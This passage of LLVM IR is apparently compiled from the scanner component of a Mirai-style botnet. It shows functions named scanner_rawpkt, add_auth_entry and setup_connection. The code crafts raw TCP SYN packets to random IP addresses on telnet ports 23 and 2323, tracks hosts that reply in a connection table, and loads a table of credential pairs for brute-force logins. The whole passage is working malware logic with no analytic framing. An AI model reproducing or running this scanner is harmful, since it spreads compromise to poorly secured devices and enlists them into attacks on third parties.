  %100 = call zeroext i16 @ntohs(i16 noundef zeroext %99) #8
  %101 = zext i16 %100 to i32
  %102 = icmp slt i32 %101, 1024
  br i1 %102, label %94, label %103, !llvm.loop !43

103:                                              ; preds = %98
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %104 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i64 1
  %106 = bitcast %struct.iphdr* %105 to %struct.tcphdr*
  store %struct.tcphdr* %106, %struct.tcphdr** %4, align 8
  %107 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = load i8, i8* %108, align 4
  %110 = and i8 %109, -16
  %111 = or i8 %110, 5
  store i8 %111, i8* %108, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = bitcast %struct.iphdr* %112 to i8*
  %114 = load i8, i8* %113, align 4
  %115 = and i8 %114, 15
  %116 = or i8 %115, 64
  store i8 %116, i8* %113, align 4
  %117 = call zeroext i16 @htons(i16 noundef zeroext 40) #8
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 2
  store i16 %117, i16* %119, align 2
  %120 = call i32 @rand_next()
  %121 = trunc i32 %120 to i16
  %122 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 3
  store i16 %121, i16* %123, align 4
  %124 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 5
  store i8 64, i8* %125, align 4
  %126 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 6
  store i8 6, i8* %127, align 1
  %128 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %129 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 1
  store i16 %128, i16* %130, align 2
  %131 = load i16, i16* %2, align 2
  %132 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 0
  store i16 %131, i16* %133, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 4
  %136 = load i16, i16* %135, align 4
  %137 = and i16 %136, -241
  %138 = or i16 %137, 80
  store i16 %138, i16* %135, align 4
  %139 = call i32 @rand_next()
  %140 = and i32 %139, 65535
  %141 = trunc i32 %140 to i16
  %142 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 5
  store i16 %141, i16* %143, align 2
  %144 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -513
  %148 = or i16 %147, 512
  store i16 %148, i16* %145, align 4
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 4)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i16 noundef zeroext 8)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i16 noundef zeroext 12)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i16 noundef zeroext 12)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 noundef zeroext 7)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i16 noundef zeroext 12)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i16 noundef zeroext 10)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i16 noundef zeroext 14)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i16 noundef zeroext 11)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0), i16 noundef zeroext 17)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i16 noundef zeroext 8)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i16 noundef zeroext 9)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0), i16 noundef zeroext 15)
  call void @add_auth_entry(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0), i16 noundef zeroext 15)
  br label %149

149:                                              ; preds = %976, %103
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %150 = load i32, i32* @fake_time, align 4
  %151 = load i32, i32* %10, align 4
  %152 = icmp ne i32 %150, %151
  br i1 %152, label %153, label %226

153:                                              ; preds = %149
  %154 = load i32, i32* @fake_time, align 4
  store i32 %154, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %155

155:                                              ; preds = %222, %153
  %156 = load i32, i32* %1, align 4
  %157 = icmp slt i32 %156, 384
  br i1 %157, label %158, label %225

158:                                              ; preds = %155
  %159 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %159, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %160 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i64 1
  %162 = bitcast %struct.iphdr* %161 to %struct.tcphdr*
  store %struct.tcphdr* %162, %struct.tcphdr** %16, align 8
  %163 = call i32 @rand_next()
  %164 = trunc i32 %163 to i16
  %165 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i32, i32* @LOCAL_ADDR, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = call i32 @get_random_ip()
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  store i32 %170, i32* %172, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 7
  store i16 0, i16* %174, align 2
  %175 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %176 = bitcast %struct.iphdr* %175 to i16*
  %177 = call zeroext i16 @checksum_generic(i16* noundef %176, i32 noundef 20)
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 7
  store i16 %177, i16* %179, align 2
  %180 = load i32, i32* %1, align 4
  %181 = srem i32 %180, 10
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %187

183:                                              ; preds = %158
  %184 = call zeroext i16 @htons(i16 noundef zeroext 2323) #8
  %185 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 1
  store i16 %184, i16* %186, align 2
  br label %191

187:                                              ; preds = %158
  %188 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %189 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  br label %191

191:                                              ; preds = %187, %183
  %192 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  %194 = load i32, i32* %193, align 4
  %195 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 2
  store i32 %194, i32* %196, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 6
  store i16 0, i16* %198, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %200 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %201 = bitcast %struct.tcphdr* %200 to i8*
  %202 = call zeroext i16 @htons(i16 noundef zeroext 20) #8
  %203 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %199, i8* noundef %201, i16 noundef zeroext %202, i32 noundef 20)
  %204 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 6
  store i16 %203, i16* %205, align 4
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %206, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  %209 = load i32, i32* %208, align 4
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %211 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %210, i32 0, i32 0
  store i32 %209, i32* %211, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  %214 = load i16, i16* %213, align 2
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %214, i16* %215, align 2
  %216 = load i32, i32* @rsck, align 4
  %217 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %218 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %218, %struct.sockaddr** %217, align 8
  %219 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %220 = load %struct.sockaddr*, %struct.sockaddr** %219, align 8
  %221 = call i64 @sendto(i32 noundef %216, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), i64 noundef 40, i32 noundef 16384, %struct.sockaddr* %220, i32 noundef 16)
  br label %222

222:                                              ; preds = %191
  %223 = load i32, i32* %1, align 4
  %224 = add nsw i32 %223, 1
  store i32 %224, i32* %1, align 4
  br label %155, !llvm.loop !44

225:                                              ; preds = %155
  br label %226

226:                                              ; preds = %225, %149
  store i32 0, i32* %9, align 4
  br label %227

227:                                              ; preds = %368, %340, %328, %320, %312, %304, %296, %287, %270, %263, %256, %226
  %228 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %229 = bitcast i8* %228 to %struct.iphdr*
  store %struct.iphdr* %229, %struct.iphdr** %20, align 8
  %230 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i64 1
  %232 = bitcast %struct.iphdr* %231 to %struct.tcphdr*
  store %struct.tcphdr* %232, %struct.tcphdr** %21, align 8
  %233 = call i32* @__errno_location() #8
  store i32 0, i32* %233, align 4
  %234 = load i32, i32* @rsck, align 4
  %235 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %236 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %236, align 8
  %237 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %238 = load %struct.sockaddr*, %struct.sockaddr** %237, align 8
  %239 = call i64 @recvfrom(i32 noundef %234, i8* noundef %235, i64 noundef 1514, i32 noundef 16384, %struct.sockaddr* %238, i32* noundef null)
  %240 = trunc i64 %239 to i32
  store i32 %240, i32* %18, align 4
  %241 = load i32, i32* %18, align 4
  %242 = icmp sle i32 %241, 0
  br i1 %242, label %251, label %243

243:                                              ; preds = %227
  %244 = call i32* @__errno_location() #8
  %245 = load i32, i32* %244, align 4
  %246 = icmp eq i32 %245, 11
  br i1 %246, label %251, label %247

247:                                              ; preds = %243
  %248 = call i32* @__errno_location() #8
  %249 = load i32, i32* %248, align 4
  %250 = icmp eq i32 %249, 11
  br i1 %250, label %251, label %252

251:                                              ; preds = %247, %243, %227
  br label %380

252:                                              ; preds = %247
  %253 = load i32, i32* %18, align 4
  %254 = sext i32 %253 to i64
  %255 = icmp ult i64 %254, 40
  br i1 %255, label %256, label %257

256:                                              ; preds = %252
  br label %227

257:                                              ; preds = %252
  %258 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 9
  %260 = load i32, i32* %259, align 4
  %261 = load i32, i32* @LOCAL_ADDR, align 4
  %262 = icmp ne i32 %260, %261
  br i1 %262, label %263, label %264

263:                                              ; preds = %257
  br label %227

264:                                              ; preds = %257
  %265 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 6
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp ne i32 %268, 6
  br i1 %269, label %270, label %271

270:                                              ; preds = %264
  br label %227

271:                                              ; preds = %264
  %272 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 0
  %274 = load i16, i16* %273, align 4
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @htons(i16 noundef zeroext 23) #8
  %277 = zext i16 %276 to i32
  %278 = icmp ne i32 %275, %277
  br i1 %278, label %279, label %288

279:                                              ; preds = %271
  %280 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 0
  %282 = load i16, i16* %281, align 4
  %283 = zext i16 %282 to i32
  %284 = call zeroext i16 @htons(i16 noundef zeroext 2323) #8
  %285 = zext i16 %284 to i32
  %286 = icmp ne i32 %283, %285
  br i1 %286, label %287, label %288

287:                                              ; preds = %279
  br label %227

288:                                              ; preds = %279, %271
  %289 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = zext i16 %291 to i32
  %293 = load i16, i16* %2, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp ne i32 %292, %294
  br i1 %295, label %296, label %297

296:                                              ; preds = %288
  br label %227

297:                                              ; preds = %288
  %298 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 4
  %300 = load i16, i16* %299, align 4
  %301 = lshr i16 %300, 9
  %302 = and i16 %301, 1
  %303 = icmp ne i16 %302, 0
  br i1 %303, label %305, label %304

304:                                              ; preds = %297
  br label %227

305:                                              ; preds = %297
  %306 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 4
  %308 = load i16, i16* %307, align 4
  %309 = lshr i16 %308, 12
  %310 = and i16 %309, 1
  %311 = icmp ne i16 %310, 0
  br i1 %311, label %313, label %312

312:                                              ; preds = %305
  br label %227

313:                                              ; preds = %305
  %314 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = lshr i16 %316, 10
  %318 = and i16 %317, 1
  %319 = icmp ne i16 %318, 0
  br i1 %319, label %320, label %321

320:                                              ; preds = %313
  br label %227

321:                                              ; preds = %313
  %322 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i32 0, i32 4
  %324 = load i16, i16* %323, align 4
  %325 = lshr i16 %324, 8
  %326 = and i16 %325, 1
  %327 = icmp ne i16 %326, 0
  br i1 %327, label %328, label %329

328:                                              ; preds = %321
  br label %227

329:                                              ; preds = %321
  %330 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 3
  %332 = load i32, i32* %331, align 4
  %333 = call i32 @ntohl(i32 noundef %332) #8
  %334 = sub i32 %333, 1
  %335 = call i32 @htonl(i32 noundef %334) #8
  %336 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 8
  %338 = load i32, i32* %337, align 4
  %339 = icmp ne i32 %335, %338
  br i1 %339, label %340, label %341

340:                                              ; preds = %329
  br label %227

341:                                              ; preds = %329
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %342 = load i32, i32* %9, align 4
  store i32 %342, i32* %18, align 4
  br label %343

343:                                              ; preds = %361, %341
  %344 = load i32, i32* %18, align 4
  %345 = icmp slt i32 %344, 256
  br i1 %345, label %346, label %364

346:                                              ; preds = %343
  %347 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %348 = load i32, i32* %18, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %347, i64 %349
  %351 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %350, i32 0, i32 3
  %352 = load i32, i32* %351, align 8
  %353 = icmp eq i32 %352, 0
  br i1 %353, label %354, label %360

354:                                              ; preds = %346
  %355 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %356 = load i32, i32* %18, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %355, i64 %357
  store %struct.scanner_connection* %358, %struct.scanner_connection** %22, align 8
  %359 = load i32, i32* %18, align 4
  store i32 %359, i32* %9, align 4
  br label %364

360:                                              ; preds = %346
  br label %361

361:                                              ; preds = %360
  %362 = load i32, i32* %18, align 4
  %363 = add nsw i32 %362, 1
  store i32 %363, i32* %18, align 4
  br label %343, !llvm.loop !45

364:                                              ; preds = %354, %343
  %365 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %366 = icmp eq %struct.scanner_connection* %365, null
  br i1 %366, label %367, label %368

367:                                              ; preds = %364
  br label %380

368:                                              ; preds = %364
  %369 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 8
  %371 = load i32, i32* %370, align 4
  %372 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %373 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %372, i32 0, i32 4
  store i32 %371, i32* %373, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 0
  %376 = load i16, i16* %375, align 4
  %377 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %378 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %377, i32 0, i32 5
  store i16 %376, i16* %378, align 8
  %379 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %379)
  br label %227

380:                                              ; preds = %367, %251
  br label %381

381:                                              ; preds = %380
  store %struct.fd_set.21* %5, %struct.fd_set.21** %25, align 8
  store i32 0, i32* %24, align 4
  br label %382

382:                                              ; preds = %392, %381
  %383 = load i32, i32* %24, align 4
  %384 = zext i32 %383 to i64
  %385 = icmp ult i64 %384, 16
  br i1 %385, label %386, label %395

386:                                              ; preds = %382
  %387 = load %struct.fd_set.21*, %struct.fd_set.21** %25, align 8
  %388 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %387, i32 0, i32 0
  %389 = load i32, i32* %24, align 4
  %390 = zext i32 %389 to i64
  %391 = getelementptr inbounds [16 x i64], [16 x i64]* %388, i64 0, i64 %390
  store i64 0, i64* %391, align 8
  br label %392

392:                                              ; preds = %386
  %393 = load i32, i32* %24, align 4
  %394 = add i32 %393, 1
  store i32 %394, i32* %24, align 4
  br label %382, !llvm.loop !46

395:                                              ; preds = %382
  br label %396

396:                                              ; preds = %395
  br label %397

397:                                              ; preds = %396
  store %struct.fd_set.21* %6, %struct.fd_set.21** %27, align 8
  store i32 0, i32* %26, align 4
  br label %398

398:                                              ; preds = %408, %397
  %399 = load i32, i32* %26, align 4
  %400 = zext i32 %399 to i64
  %401 = icmp ult i64 %400, 16
  br i1 %401, label %402, label %411

402:                                              ; preds = %398
  %403 = load %struct.fd_set.21*, %struct.fd_set.21** %27, align 8
  %404 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %403, i32 0, i32 0
  %405 = load i32, i32* %26, align 4
  %406 = zext i32 %405 to i64
  %407 = getelementptr inbounds [16 x i64], [16 x i64]* %404, i64 0, i64 %406
  store i64 0, i64* %407, align 8
  br label %408

408:                                              ; preds = %402
  %409 = load i32, i32* %26, align 4
  %410 = add i32 %409, 1
  store i32 %410, i32* %26, align 4
  br label %398, !llvm.loop !47

411:                                              ; preds = %398
  br label %412

412:                                              ; preds = %411
  store i32 0, i32* %1, align 4
  br label %413

413:                                              ; preds = %535, %412
  %414 = load i32, i32* %1, align 4
  %415 = icmp slt i32 %414, 256
  br i1 %415, label %416, label %538

416:                                              ; preds = %413
  %417 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %418 = load i32, i32* %1, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %417, i64 %419
  store %struct.scanner_connection* %420, %struct.scanner_connection** %7, align 8
  %421 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %422 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %421, i32 0, i32 3
  %423 = load i32, i32* %422, align 8
  %424 = icmp ugt i32 %423, 1
  %425 = zext i1 %424 to i64
  %426 = select i1 %424, i32 30, i32 5
  store i32 %426, i32* %28, align 4
  %427 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %427, i32 0, i32 3
  %429 = load i32, i32* %428, align 8
  %430 = icmp ne i32 %429, 0
  br i1 %430, label %431, label %471

431:                                              ; preds = %416
  %432 = load i32, i32* @fake_time, align 4
  %433 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %434 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %433, i32 0, i32 2
  %435 = load i32, i32* %434, align 4
  %436 = sub i32 %432, %435
  %437 = load i32, i32* %28, align 4
  %438 = icmp ugt i32 %436, %437
  br i1 %438, label %439, label %471

439:                                              ; preds = %431
  %440 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %441 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %440, i32 0, i32 1
  %442 = load i32, i32* %441, align 8
  %443 = call i32 @close(i32 noundef %442)
  %444 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %445 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %444, i32 0, i32 1
  store i32 -1, i32* %445, align 8
  %446 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %447 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %446, i32 0, i32 3
  %448 = load i32, i32* %447, align 8
  %449 = icmp ugt i32 %448, 2
  br i1 %449, label %450, label %465

450:                                              ; preds = %439
  %451 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %452 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %451, i32 0, i32 8
  %453 = load i8, i8* %452, align 8
  %454 = add i8 %453, 1
  store i8 %454, i8* %452, align 8
  %455 = zext i8 %454 to i32
  %456 = icmp eq i32 %455, 10
  br i1 %456, label %457, label %462

457:                                              ; preds = %450
  %458 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %458, i32 0, i32 8
  store i8 0, i8* %459, align 8
  %460 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %461 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %460, i32 0, i32 3
  store i32 0, i32* %461, align 8
  br label %464

462:                                              ; preds = %450
  %463 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %463)
  br label %464

464:                                              ; preds = %462, %457
  br label %470

465:                                              ; preds = %439
  %466 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %467 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %466, i32 0, i32 8
  store i8 0, i8* %467, align 8
  %468 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %469 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %468, i32 0, i32 3
  store i32 0, i32* %469, align 8
  br label %470

470:                                              ; preds = %465, %464
  br label %535

471:                                              ; preds = %431, %416
  %472 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %473 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %472, i32 0, i32 3
  %474 = load i32, i32* %473, align 8
  %475 = icmp eq i32 %474, 1
  br i1 %475, label %476, label %502

476:                                              ; preds = %471
  %477 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %478 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %477, i32 0, i32 1
  %479 = load i32, i32* %478, align 8
  %480 = srem i32 %479, 64
  %481 = zext i32 %480 to i64
  %482 = shl i64 1, %481
  %483 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %6, i32 0, i32 0
  %484 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %484, i32 0, i32 1
  %486 = load i32, i32* %485, align 8
  %487 = sdiv i32 %486, 64
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [16 x i64], [16 x i64]* %483, i64 0, i64 %488
  %490 = load i64, i64* %489, align 8
  %491 = or i64 %490, %482
  store i64 %491, i64* %489, align 8
  %492 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %493 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %492, i32 0, i32 1
  %494 = load i32, i32* %493, align 8
  %495 = load i32, i32* %12, align 4
  %496 = icmp sgt i32 %494, %495
  br i1 %496, label %497, label %501

497:                                              ; preds = %476
  %498 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
